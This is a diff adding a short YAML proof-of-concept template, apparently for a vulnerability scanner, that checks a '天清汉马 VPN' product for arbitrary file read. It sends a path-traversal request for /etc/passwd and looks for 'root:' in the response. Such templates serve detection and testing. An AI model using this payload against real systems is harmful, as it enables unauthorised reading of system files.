@@ -1,0 +1,9 @@
+name: poc-yaml-天清汉马VPN-Directory
+description: "任意文件读取"
+method: GET
+path:
+  - /vpn/user/download/client?ostype=../../../../../../../../../etc/passwd
+expression:
+  status: 200
+  body_any:
+    - "root:"
